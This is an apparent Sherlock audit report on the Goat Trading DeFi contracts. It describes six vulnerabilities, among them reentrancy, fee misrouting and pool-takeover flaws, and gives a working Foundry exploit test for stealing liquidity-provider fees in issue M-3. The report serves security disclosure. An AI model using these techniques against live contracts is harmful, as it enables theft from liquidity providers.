# Issue H-1: Some unusual problems arise in the use of the `GoatV1Factory.sol#createPair()` function. 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/18 

## Found by 
FastTiger
## Summary
If you create a new pool for tokens and add liquidity using the `GoatRouterV1.sol#addLiquidity()` function, the bootstrap function of the protocol is broken.
Therefore, an attacker can perform the front running attack on the `GoatRouterV1.sol#addLiquidity()` function by front calling `GoatV1Factory.sol#createPair()`. 
## Vulnerability Detail
If a pool for the token does not exist, the LP can create a new pool using the `GoatV1Factory.sol#createPair()` function. Next he calls `GoatRouterV1.sol#addLiquidity()` to provide liquidity. At this time, the amount of WETH and ERC20Token provided to the pool is calculated in the `GoatRouterV1.sol#_addLiquidity()` function.
```solidity
    function _addLiquidity(
        address token,
        uint256 tokenDesired,
        uint256 wethDesired,
        uint256 tokenMin,
        uint256 wethMin,
        GoatTypes.InitParams memory initParams
    ) internal returns (uint256, uint256, bool) {
        GoatTypes.LocalVariables_AddLiquidity memory vars;
        GoatV1Pair pair = GoatV1Pair(GoatV1Factory(FACTORY).getPool(token));
        if (address(pair) == address(0)) {
            // First time liquidity provider
            pair = GoatV1Pair(GoatV1Factory(FACTORY).createPair(token, initParams));
            vars.isNewPair = true;
        }

        if (vars.isNewPair) {
...SNIP
        } else {
            /**
             * @dev This block is accessed after the presale period is over and the pool is converted to AMM
             */
250:        (uint256 wethReserve, uint256 tokenReserve) = pair.getReserves();
251:        uint256 tokenAmountOptimal = GoatLibrary.quote(wethDesired, wethReserve, tokenReserve);
252:        if (tokenAmountOptimal <= tokenDesired) {
253:            if (tokenAmountOptimal < tokenMin) {
254:                revert GoatErrors.InsufficientTokenAmount();
255:            }
256:            (vars.tokenAmount, vars.wethAmount) = (tokenAmountOptimal, wethDesired);
257:        } else {
258:            uint256 wethAmountOptimal = GoatLibrary.quote(tokenDesired, tokenReserve, wethReserve);
259:            assert(wethAmountOptimal <= wethDesired);
260:            if (wethAmountOptimal < wethMin) revert GoatErrors.InsufficientWethAmount();
261:            (vars.tokenAmount, vars.wethAmount) = (tokenDesired, wethAmountOptimal);
262:        }
263:    }
264:    return (vars.tokenAmount, vars.wethAmount, vars.isNewPair);
    }
```

For simplicity, let’s only consider from #L250 to #L256.

L250:wethReserve = virtualEth, 
     tokenReserve = initialTokenMatch - (initialTokenMatch - ((virtualEth * initialTokenMatch)/(virtualEth + bootstrapEth)) + 
                    + (virtualEth*initialTokenMatch*bootstrapEth)/(virtualEth + bootstrapEth) ^ 2) = 
                    = ((virtualEth * initialTokenMatch)/(virtualEth + bootstrapEth)) - (virtualEth*initialTokenMatch*bootstrapEth)/(virtualEth + bootstrapEth) ^ 2
L251:tokenAmountOptimal = wethDesired * wethReserve / tokenReserve
     vars.tokenAmount = tokenAmountOptimal
     vars.wethAmount = wethDesired

At this time, At this time, the calculated balance of ETH and token is sent to the pool, and `GoatV1Pair(vars.pair).mint()` is called in the `GoatRouterV1.sol#addLiquidity()` function.
```solidity
    function addLiquidity(
        address token,
        uint256 tokenDesired,
        uint256 wethDesired,
        uint256 tokenMin,
        uint256 wethMin,
        address to,
        uint256 deadline,
        GoatTypes.InitParams memory initParams
    ) external nonReentrant ensure(deadline) returns (uint256, uint256, uint256) {
...SNIP
65:     IERC20(vars.token).safeTransferFrom(msg.sender, vars.pair, vars.actualTokenAmount);
66:     if (vars.wethAmount != 0) {
67:         IERC20(WETH).safeTransferFrom(msg.sender, vars.pair, vars.wethAmount);
68:     }
69:     vars.liquidity = GoatV1Pair(vars.pair).mint(to);
...SNIP
    }
```
Next, the `GoatV1Pair(vars.pair).mint()` function checks the validity of the transmitted token.
```solidity
    function mint(address to) external nonReentrant returns (uint256 liquidity) {
    ...SNIP
        if (_vestingUntil == _MAX_UINT32) {
            // Do not allow to add liquidity in presale period
            if (totalSupply_ > 0) revert GoatErrors.PresalePeriod();
            // don't allow to send more eth than bootstrap eth
            if (balanceEth > mintVars.bootstrapEth) {
                revert GoatErrors.SupplyMoreThanBootstrapEth();
            }

            if (balanceEth < mintVars.bootstrapEth) {
                (uint256 tokenAmtForPresale, uint256 tokenAmtForAmm) = _tokenAmountsForLiquidityBootstrap(
                    mintVars.virtualEth, mintVars.bootstrapEth, balanceEth, mintVars.initialTokenMatch
                );
139:            if (balanceToken != (tokenAmtForPresale + tokenAmtForAmm)) {
                    revert GoatErrors.InsufficientTokenAmount();
                }
                liquidity =
                    Math.sqrt(uint256(mintVars.virtualEth) * uint256(mintVars.initialTokenMatch)) - MINIMUM_LIQUIDITY;
            } else {
                // This means that user is willing to make this pool an amm pool in first liquidity mint
146:            liquidity = Math.sqrt(balanceEth * balanceToken) - MINIMUM_LIQUIDITY;
147:            uint32 timestamp = uint32(block.timestamp);
148:            _vestingUntil = timestamp + VESTING_PERIOD;
            }
            mintVars.isFirstMint = true;
        }
    ...SNIP
    }
```

In here, `balanceToken = vars.tokenAmount (value:tokenAmountOptimal)` and `tokenAmtForPresale + tokenAmtForAmm` is calculated follows.

tokenAmtForPresale = initialTokenMatch - (virtualEth * initialTokenMatch / (virtualEth + bootstrapEth)) - 
                    - (balanceEth(value:wethDesired)*initialTokenMatch/(virtualEth+balanceEth))
tokenAmtForAmm = (virtualEth * initialTokenMatch * bootstrapEth) / (virtualEth + bootstrapEth) ^ 2

As a result, `(balanceToken != (tokenAmtForPresale + tokenAmtForAmm)) == true`, the `GoatRouterV1.sol#addLiquidity()` function is reverted.
In this case, If the initial LP want to provide liquidity to the pool, he must pay an amount of WETH equivalent to bootstrapEth to execute #L146.
As a result, the bootstrap function is broken.

Based on this fact, an attacker can front run the `createPair()` function if he finds the `addLiquidity()` function in the mempool.
## Impact
The bootstrap function of the protocol is broken and the initial LP must pay an amount of WETH equivalent to bootstrapEth.
## Code Snippet
https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Factory.sol#L33
https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/periphery/GoatRouterV1.sol#L51
https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/periphery/GoatRouterV1.sol#L287
https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/periphery/GoatRouterV1.sol#L233
https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L139-L141
## Tool used

Manual Review

## Recommendation
It is recommended that the `GoatV1Factory.sol#.createPair()` function be called only from the `GoatRouterV1` contract.

# Issue H-2: Reentrancy in `GoatPairV1::burn` if token is a non-standard ERC20 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/52 

## Found by 
Tonchi, cryptoThemeX, m4k2
## Summary
A reentrancy is possible is the `GoatPairV1::burn` method.

## Vulnerability Detail

The `GoatPairV1::burn` method is susceptible to reentrancy if the token used to create the liquidity pool is an ERC777 or a non-standard ERC20 token. This vulnerability allows attackers to potentially break or steal funds from the contract.

Furthermore, the `nonReentrant` modifier, which prevents reentrancy, is not applied to the `burn` function. The absence of strict checks for ERC20 compliance in the codebase allows for the creation of liquidity pools with ERC777 or similar tokens, exacerbating this vulnerability.

Given the increasing prevalence of non-standard ERC20 tokens, mitigating this vulnerability is crucial.
## Impact

## Proof of concept

The vulnerability arises from the lack of respect for Check-Effects-Interactions (CEI) and the absence of protection against reentrancy. A snippet of the vulnerable code is provided below:

## Code Snippet
[https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L191-L217](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L191-L217)

The vulnerability key part:

```solidity

        // Transfer liquidity tokens to the user
        IERC20(_weth).safeTransfer(to, amountWeth);

        // Reentrancy possible here
        IERC20(_token).safeTransfer(to, amountToken);
        uint256 balanceEth = IERC20(_weth).balanceOf(address(this));
        uint256 balanceToken = IERC20(_token).balanceOf(address(this));

        _update(balanceEth, balanceToken, true);
```

As evident from the code snippet, the Check-Effects-Interactions (CEI) principle is not adhered to, and due to the absence of safeguards against reentrancy, it becomes feasible to reenter the deposit or swap functions following LP withdrawal, while the reserves remain unaltered.


## Tool used

Manual analysis

Foundry tests

## Recommendation

Two solutions are possible to mitigate this vulnerability:

1. Apply the `nonReentrant` modifier on the `burn` function:
```diff
- function burn(address to) external returns (uint256 amountWeth, uint256 amountToken) {
+ function burn(address to) external returns (uint256 amountWeth, uint256 amountToken) nonReentrant {
```

2. Transfer token at the end of execution:

```diff
- IERC20(_weth).safeTransfer(to, amountWeth);
- IERC20(_token).safeTransfer(to, amountToken);

// Transfer liquidity tokens to the user
+ uint256 balanceEth = IERC20(_weth).balanceOf(address(this)) - amountWeth;
+ uint256 balanceToken = IERC20(_token).balanceOf(address(this)) - amountToken;

- uint256 balanceEth = IERC20(_weth).balanceOf(address(this));
- uint256 balanceToken = IERC20(_token).balanceOf(address(this));

_update(balanceEth, balanceToken, true);

+ IERC20(_weth).safeTransfer(to, amountWeth);
+ IERC20(_token).safeTransfer(to, amountToken);
```

Implementing one or both of these mitigation strategies will enhance the security of the GoatPairV1 liquidity pool contract against reentrancy attacks.



## Discussion

**chiranz**

Non-standard ERC20's that have callbacks on transfer are not considered.. 

# Issue H-3: Incorrect Fee Update Address in GoatV1Pair.burn when using removeLiquidityETH() 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/80 

## Found by 
aycozynfada
https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/periphery/GoatRouterV1.sol#L110-L146
https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L191-L217

## Summary
The burn function incorrectly updates the fee address in GoatV1Pair.burn when called by removeLiquidityETH() because the removeLiquidityETH() sets the to address as the GoatRouterV1.sol contract address 
## Vulnerability Detail
When removing liquidity as ETH, the removeLiquidityETH() is called, this functions doesn't call GoatV1Pair.burn but calls removeLiquidity() which is the function that eventually calls GoatV1Pair.burn.
The issue arises in the removeLiquidityETH() which sets the "TO" parameter to address.this before calling removeLiquidity(). 
removeLiquidity() calls GoatV1Pair.burn to remove liquidity and transfer ETH back to the GoatRouterV1 contract. Although the ETH is subsequently transferred to the intended recipient through removeLiquidityETH(), the intended recipient is denied fee rewards because GoatV1Pair.burn  updates fees rewards for GoatRouterV1 contract address and not the recipient address
## Impact
High as there is Incorrect Fee Distribution  and protocol  makes away with rewards intended for users, also anybody can GoatRouterV1.withDraw, input the router address and make away with fees recorded during this transactions
## Code Snippet
removeLiquidityETH() calls removeLiquidity below and uses address.this as "to address

```solidity
   function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 tokenMin,//users receives lesss token than expected for FET tokens 
        uint256 ethMin,//slippage is only checked in removeliquidity
        address to,
        uint256 deadline
    ) external ensure(deadline) returns (uint256 amountWeth, uint256 amountToken) {
        (amountWeth, amountToken) = removeLiquidity(token, liquidity, tokenMin, ethMin, address(this), deadline);
        IERC20(token).safeTransfer(to, amountToken);
        IWETH(WETH).withdraw(amountWeth);
        (bool success,) = to.call{value: amountWeth}("");
        if (!success) {
            revert GoatErrors.EthTransf erFailed();
        }
    }

    // **** REMOVE LIQUIDITY ****
    function removeLiquidity(
        address token,
        uint256 liquidity,
        uint256 tokenMin,
        uint256 wethMin,
        address to,
        uint256 deadline
    ) public nonReentrant ensure(deadline) returns (uint256 amountWeth, uint256 amountToken) {
        address pair = GoatV1Factory(FACTORY).getPool(token);

        IERC20(pair).safeTransferFrom(msg.sender, pair, liquidity);
        (amountWeth, amountToken) = GoatV1Pair(pair).burn(to);
        if (amountWeth < wethMin) {
            revert GoatErrors.InsufficientWethAmount();
        }
        if (amountToken < tokenMin) {
            revert GoatErrors.InsufficientTokenAmount();
        }
    }
```
Burn function updates fees to router instead of recipient address
```solidity
  function burn(address to) external returns (uint256 amountWeth, uint256 amountToken) {
        uint256 liquidity = balanceOf(address(this));

        // initial lp can bypass this check by using different
        // to address so _lastPoolTokenSender is used
        if (_vestingUntil == _MAX_UINT32) revert GoatErrors.PresalePeriod();

        uint256 totalSupply_ = totalSupply();
        amountWeth = (liquidity * _reserveEth) / totalSupply_;
        amountToken = (liquidity * _reserveToken) / totalSupply_;
        if (amountWeth == 0 || amountToken == 0) {
            revert GoatErrors.InsufficientLiquidityBurned();
        }

        _updateFeeRewards(to);
        _burn(address(this), liquidity);

        // Transfer liquidity tokens to the user
        IERC20(_weth).safeTransfer(to, amountWeth);
        IERC20(_token).safeTransfer(to, amountToken);
        uint256 balanceEth = IERC20(_weth).balanceOf(address(this));
        uint256 balanceToken = IERC20(_token).balanceOf(address(this));

        _update(balanceEth, balanceToken, true);

        emit Burn(msg.sender, amountWeth, amountToken, to);
    }

```
## Tool used

Manual Review

## Recommendation
add an input parameter that ensure the recipient address included when calling GoatV1Pair.burn from removeLiquidityETH()





## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  this seem valid; high(2)



# Issue M-1: No check for `initialEth` in `GoatV1Pair.takeOverPool()`. 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/43 

## Found by 
whitehair0330
## Summary

[GoatV1Pair.takeOverPool()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L452-L538) only checks the amount of `token` for initialization, not `initialETH`.

## Vulnerability Detail

https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L452-L538

```javascript
    function takeOverPool(GoatTypes.InitParams memory initParams) external {
        if (_vestingUntil != _MAX_UINT32) {
            revert GoatErrors.ActionNotAllowed();
        }

        GoatTypes.InitialLPInfo memory initialLpInfo = _initialLPInfo;

        GoatTypes.LocalVariables_TakeOverPool memory localVars;
        address to = msg.sender;
        localVars.virtualEthOld = _virtualEth;
        localVars.bootstrapEthOld = _bootstrapEth;
        localVars.initialTokenMatchOld = _initialTokenMatch;

        (localVars.tokenAmountForPresaleOld, localVars.tokenAmountForAmmOld) = _tokenAmountsForLiquidityBootstrap(
            localVars.virtualEthOld,
            localVars.bootstrapEthOld,
            initialLpInfo.initialWethAdded,
            localVars.initialTokenMatchOld
        );

        // new token amount for bootstrap if no swaps would have occured
        (localVars.tokenAmountForPresaleNew, localVars.tokenAmountForAmmNew) = _tokenAmountsForLiquidityBootstrap(
            initParams.virtualEth, initParams.bootstrapEth, initParams.initialEth, initParams.initialTokenMatch
        );

        // team needs to add min 10% more tokens than the initial lp to take over
        localVars.minTokenNeeded =
            ((localVars.tokenAmountForPresaleOld + localVars.tokenAmountForAmmOld) * 11000) / 10000;

481     if ((localVars.tokenAmountForAmmNew + localVars.tokenAmountForPresaleNew) < localVars.minTokenNeeded) {
            revert GoatErrors.InsufficientTakeoverTokenAmount();
        }

        localVars.reserveEth = _reserveEth;

        // Actual token amounts needed if the reserves have updated after initial lp mint
        (localVars.tokenAmountForPresaleNew, localVars.tokenAmountForAmmNew) = _tokenAmountsForLiquidityBootstrap(
            initParams.virtualEth, initParams.bootstrapEth, localVars.reserveEth, initParams.initialTokenMatch
        );
        localVars.reserveToken = _reserveToken;

        // amount of tokens transferred by the new team
        uint256 tokenAmountIn = IERC20(_token).balanceOf(address(this)) - localVars.reserveToken;

        if (
            tokenAmountIn
                < (
                    localVars.tokenAmountForPresaleOld + localVars.tokenAmountForAmmOld - localVars.reserveToken
                        + localVars.tokenAmountForPresaleNew + localVars.tokenAmountForAmmNew
                )
        ) {
            revert GoatErrors.IncorrectTokenAmount();
        }

        localVars.pendingLiquidityFees = _pendingLiquidityFees;
        localVars.pendingProtocolFees = _pendingProtocolFees;

        // amount of weth transferred by the new team
        uint256 wethAmountIn = IERC20(_weth).balanceOf(address(this)) - localVars.reserveEth
            - localVars.pendingLiquidityFees - localVars.pendingProtocolFees;

        if (wethAmountIn < localVars.reserveEth) {
            revert GoatErrors.IncorrectWethAmount();
        }

        _handleTakeoverTransfers(
            IERC20(_weth), IERC20(_token), initialLpInfo.liquidityProvider, localVars.reserveEth, localVars.reserveToken
        );

        uint256 lpBalance = balanceOf(initialLpInfo.liquidityProvider);
        _burn(initialLpInfo.liquidityProvider, lpBalance);

        // new lp balance
        lpBalance = Math.sqrt(uint256(initParams.virtualEth) * initParams.initialTokenMatch) - MINIMUM_LIQUIDITY;
        _mint(to, lpBalance);

        _updateStateAfterTakeover(
            initParams.virtualEth,
            initParams.bootstrapEth,
            initParams.initialTokenMatch,
            wethAmountIn,
            tokenAmountIn,
            lpBalance,
            to,
            initParams.initialEth
        );
    }
```

Although there is a check for the amount of `token` at [L481](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L481), if the caller sets `initParams.initialEth` to 0, it can easily pass [L481](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L481) because a smaller `initParams.initialEth` results in a larger `localVars.tokenAmountForAmmNew + localVars.tokenAmountForPresaleNew`.
This is due to the fact that the former initial provider's `initialEth` does not have any effect in preventing takeovers.

## Impact

A pool could be unfairly taken over because the former initial provider's `initialEth` does not have any effect in preventing takeovers.

## Code Snippet

https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L452-L538

## Tool used

Manual Review

## Recommendation

There should be a check for `initParams.initialEth`.



## Discussion

**chiranz**

Even if check is bypassed [L481](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L481)  it will revert here [L510-L515](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L510-L515) 

**chiranz**

> Even if check is bypassed [L481](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L481) it will revert here [L510-L515](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L510-L515)

I misread your finding.. It's valid when initialEth used by someone is non zero but the one who is taking over can pass initialEth as 0 and take over pool.

# Issue M-2: Legitimate pools can be taken over and the penalty is not fair. 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/46 

## Found by 
kennedy1030, whitehair0330
## Summary

In [GoatV1Pair.takeOverPool()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L453-L538), a malicious user can take over pool from a legitimate user, because the mechanism for identifying is incorrect.  And the penalty mechanism is not fair.

## Vulnerability Detail

[GoatV1Pair.takeOverPool()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L453-L538) function exists to avoid grief, because only one pool can be created for each token.
Doc says "They can then lower the amount of virtual Ether or Ether to be raised, but not make it higher." about [GoatV1Pair.takeOverPool()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L453-L538). However, there is no checking for the amount of virtual Ether. This made it possible that legitimate pools can be taken over by malicious users.

L481 and L496 checks the amount of tokens, but there is no check for virtual Ether or Ether to be raised.
So, a malicious user can take over a legitimate pool without any cost. He can remove his cost by increasing the amount of virtual Ether or reserved Ether. Paying +10 percent token can do nothing with it. Furthermore, the old liquidity provider should pay 5% penalty. This is very unfair. Generally, a malicious user have no Ether reserved. So, it is only harmful to legitimate users.

https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L453-L538

```javascript

    function takeOverPool(GoatTypes.InitParams memory initParams) external {
        if (_vestingUntil != _MAX_UINT32) {
            revert GoatErrors.ActionNotAllowed();
        }

        GoatTypes.InitialLPInfo memory initialLpInfo = _initialLPInfo;

        GoatTypes.LocalVariables_TakeOverPool memory localVars;
        address to = msg.sender;
        localVars.virtualEthOld = _virtualEth;
        localVars.bootstrapEthOld = _bootstrapEth;
        localVars.initialTokenMatchOld = _initialTokenMatch;

        (localVars.tokenAmountForPresaleOld, localVars.tokenAmountForAmmOld) = _tokenAmountsForLiquidityBootstrap(
            localVars.virtualEthOld,
            localVars.bootstrapEthOld,
            initialLpInfo.initialWethAdded,
            localVars.initialTokenMatchOld
        );

        // new token amount for bootstrap if no swaps would have occured
        (localVars.tokenAmountForPresaleNew, localVars.tokenAmountForAmmNew) = _tokenAmountsForLiquidityBootstrap(
            initParams.virtualEth, initParams.bootstrapEth, initParams.initialEth, initParams.initialTokenMatch
        );

        // team needs to add min 10% more tokens than the initial lp to take over
        localVars.minTokenNeeded =
            ((localVars.tokenAmountForPresaleOld + localVars.tokenAmountForAmmOld) * 11000) / 10000;

481     if ((localVars.tokenAmountForAmmNew + localVars.tokenAmountForPresaleNew) < localVars.minTokenNeeded) {
            revert GoatErrors.InsufficientTakeoverTokenAmount();
        }

        localVars.reserveEth = _reserveEth;

        // Actual token amounts needed if the reserves have updated after initial lp mint
        (localVars.tokenAmountForPresaleNew, localVars.tokenAmountForAmmNew) = _tokenAmountsForLiquidityBootstrap(
            initParams.virtualEth, initParams.bootstrapEth, localVars.reserveEth, initParams.initialTokenMatch
        );
        localVars.reserveToken = _reserveToken;

        // amount of tokens transferred by the new team
        uint256 tokenAmountIn = IERC20(_token).balanceOf(address(this)) - localVars.reserveToken;

        if (
496          tokenAmountIn
497             < (
498                 localVars.tokenAmountForPresaleOld + localVars.tokenAmountForAmmOld - localVars.reserveToken
499                     + localVars.tokenAmountForPresaleNew + localVars.tokenAmountForAmmNew
500             )
        ) {
            revert GoatErrors.IncorrectTokenAmount();
        }

        localVars.pendingLiquidityFees = _pendingLiquidityFees;
        localVars.pendingProtocolFees = _pendingProtocolFees;

        // amount of weth transferred by the new team
        uint256 wethAmountIn = IERC20(_weth).balanceOf(address(this)) - localVars.reserveEth
            - localVars.pendingLiquidityFees - localVars.pendingProtocolFees;

        if (wethAmountIn < localVars.reserveEth) {
            revert GoatErrors.IncorrectWethAmount();
        }

        _handleTakeoverTransfers(
            IERC20(_weth), IERC20(_token), initialLpInfo.liquidityProvider, localVars.reserveEth, localVars.reserveToken
        );

        uint256 lpBalance = balanceOf(initialLpInfo.liquidityProvider);
        _burn(initialLpInfo.liquidityProvider, lpBalance);

        // new lp balance
        lpBalance = Math.sqrt(uint256(initParams.virtualEth) * initParams.initialTokenMatch) - MINIMUM_LIQUIDITY;
        _mint(to, lpBalance);

        _updateStateAfterTakeover(
            initParams.virtualEth,
            initParams.bootstrapEth,
            initParams.initialTokenMatch,
            wethAmountIn,
            tokenAmountIn,
            lpBalance,
            to,
            initParams.initialEth
        );
    }
```

## Impact

Legitimate pools can be taken over unfairly.

## Code Snippet

https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L453-L538

## Tool used

Manual Review

## Recommendation

I think that the mechanism for identifying should be improved. 

# Issue M-3: Liquidity provider fees can be stolen from any pair 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/63 

## Found by 
0xlamide, AhmedAdam, C1rdan, aycozynfada, m3mforve, zzykxx
## Summary
An attacker can steal the liquidiy providers fees by transfering liquidity tokens to the pair and then withdrawing fees on behalf of the pair itself.

## Vulnerability Detail

This is possible because of two reasons:
1. Transfering liquidity tokens to the pair itself [doesn't update the fee tracking variables](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L923-L925):

```solidity
if (to != address(this)) {
    _updateFeeRewards(to);
}
```
which results in the variable `feesPerTokenPaid[address(pair)]` of the pair being equal to 0.

2. The function [withdrawFees()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) is a permissionless function that allows to withdraw fees on behalf of any address, including the pair itself.

By combining this two quirks of the codebase an attacker can steal all of the currently pending liquidity provider fees by doing the following:

1. Add liquidity to a pair, which will mint the attacker some liquidity tokens
2. Transfer the liquidity tokens to the pair directly
3. Call [withdrawFees()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) by passing the address of the pair. Because `feesPerTokenPaid[address(pair)]` is 0 this will collect fees on behalf of the pair even if it shouldn't. The function will transfer an amount `x` of WETH from the pair to the pair itself and will lower the [_pendingLiquidityFee](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L622C13-L622C34) variable by that same amount 
4. Because the variable `_pendingLiquidityFee` has been lowered by `x` the pool will assume someone transferred `x` WETH to it
5. At this point the attacker can take advantage of this however he likes, but for the sake of the example let's suppose he calls [swap()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L242) to swap `x` ETH into tokens that will be transferred to his wallet
6. The attacker burns the liquidity transferred at point `2` to recover his funds

### POC

<details>
<summary>Show</summary>
To copy-paste in `GoatV1Pair.t.sol`:

```solidity
function testStealFees() public {
    GoatTypes.InitParams memory initParams;
    initParams.virtualEth = 10e18;
    initParams.initialEth = 10e18;
    initParams.initialTokenMatch = 10e18;
    initParams.bootstrapEth = 10e18;

    address pairAddress = factory.createPair(address(goat), initParams);
    address to = users.lp;

    //-> The following block of code:
    //  1. Creates a pool and immediately converts it into AMM
    //  2. Skips 31 days to skip the vesting period
    //  3. Simulates users using the pool by performing a bunch of swaps
    {
        //-> 1. A pair is created and immediately converted to an AMM
        (uint256 tokenAmtForPresale, uint256 tokenAmtForAmm) = GoatLibrary.getTokenAmountsForPresaleAndAmm(
            initParams.virtualEth, initParams.bootstrapEth, initParams.initialEth, initParams.initialTokenMatch
        );
        uint256 bootstrapTokenAmt = tokenAmtForPresale + tokenAmtForAmm;

        _fundMe(IERC20(address(goat)), to, bootstrapTokenAmt);
        _fundMe(IERC20(address(weth)), to, initParams.initialEth);
        vm.startPrank(to);

        goat.transfer(pairAddress, bootstrapTokenAmt);
        weth.transfer(pairAddress, initParams.initialEth);
        pair = GoatV1Pair(pairAddress);
        pair.mint(to);
        vm.stopPrank();

        //-> 2. Skips 31 days to skip the vesting period
        skip(31 days);
        
        //-> 3. Simulates users using the pool by performing a bunch of swaps
        uint256 reserveEth = 0;
        uint256 reserveToken = 0;
        _fundMe(IERC20(address(goat)), to, 100e18);
        _fundMe(IERC20(address(weth)), to, 100e18);
        for(uint256 i; i < 100; i++) {
            (reserveEth, reserveToken) = pair.getReserves();
            uint256 wethIn = 1e18;
            uint256 goatOut = GoatLibrary.getTokenAmountOutAmm(wethIn, reserveEth, reserveToken);
            vm.startPrank(to);
            weth.transfer(address(pair), wethIn);
            pair.swap(goatOut, 0, to);
            vm.stopPrank();

            skip(3); //Avoid MEV restrictions

            (reserveEth, reserveToken) = pair.getReserves();
            uint256 goatIn = 1e18;
            uint256 wethOut = GoatLibrary.getWethAmountOutAmm(wethIn, reserveEth, reserveToken);
            vm.startPrank(to);
            goat.transfer(address(pair), goatIn);
            pair.swap(0, wethOut, to);
            vm.stopPrank();
        }
    }

    //-> The pool has some pending liquidity fees
    uint256 pendingLiquidityFeesBefore = pair.getPendingLiquidityFees();
    assertEq(pendingLiquidityFeesBefore, 809840958520307912);

    //-> The attacker adds liquidity to the pool 
    address attacker = makeAddr("attacker");
    (uint256 reserveEth, uint256 reserveToken) = pair.getReserves();
    uint256 initialGoatAmount = 5.54e18;
    uint256 initialWethAmount = GoatLibrary.quote(initialGoatAmount, reserveToken, reserveEth);
    _fundMe(IERC20(address(goat)), attacker, initialGoatAmount);
    _fundMe(IERC20(address(weth)), attacker, initialWethAmount);
    vm.startPrank(attacker);
    goat.transfer(pairAddress, initialGoatAmount);
    weth.transfer(pairAddress, initialWethAmount);
    pair.mint(address(attacker));
    vm.stopPrank();

    //-> Two days needs to be skipped to avoid locking time
    skip(2 days);

    //-> The attacker does the following:
    //  -> 1. Transfers the liquidity tokens to the pair
    //  -> 2. Calls `withdrawFees()` on behalf of the pair which will lower `getPendingLiquidityFees` variables and transfers WETH from the pool to the pool
    //  -> 3. Swaps the excess WETH in the pool to GOAT tokens
    //  -> 4. Burns the liquidity he previously transferred to the pair
    //  -> 5. The attacker profits and LP lose their fees
    {
        vm.startPrank(attacker);

        //-> 1. Transfers the liquidity tokens to the pair
        pair.transfer(address(pair), pair.balanceOf(attacker));

        //-> 2. Calls `withdrawFees()` on behalf of the pair
        pair.withdrawFees(address(pair));

        //-> An extra amount of WETH equal to the fees withdrawn on behalf of the pool is now in the pool 
        uint256 pendingLiquidityFeesAfter = pair.getPendingLiquidityFees();
        (uint256 reserveEthCurrent, uint256 reserveTokenCurrent) = pair.getReserves();
        uint256 extraWethInPool = weth.balanceOf(address(pair)) - reserveEthCurrent - pair.getPendingLiquidityFees() - pair.getPendingProtocolFees();
        assertEq(pendingLiquidityFeesBefore - pendingLiquidityFeesAfter, extraWethInPool);

        //-> 3. Swaps the excess WETH in the pool to GOAT tokens
        uint256 goatOut = GoatLibrary.getTokenAmountOutAmm(extraWethInPool, reserveEthCurrent, reserveTokenCurrent);
        pair.swap(goatOut, 0, attacker);

        //-> 4. Burns the liquidity he previously transferred to the pair
        pair.burn(attacker);

        //-> 5. The attacker profits and LP lose their fees
        uint256 attackerWethProfit = weth.balanceOf(attacker) - initialWethAmount;
        uint256 attackerGoatProfit = goat.balanceOf(attacker) - initialGoatAmount;
        assertEq(attackerWethProfit, 399855575210658419);
        assertEq(attackerGoatProfit, 453187161321825804);

        vm.stopPrank();
    }
}

```
</details>

## Impact

Liquidity provider fees can be stolen from any pair.

## Code Snippet

## Tool used

Manual Review

## Recommendation

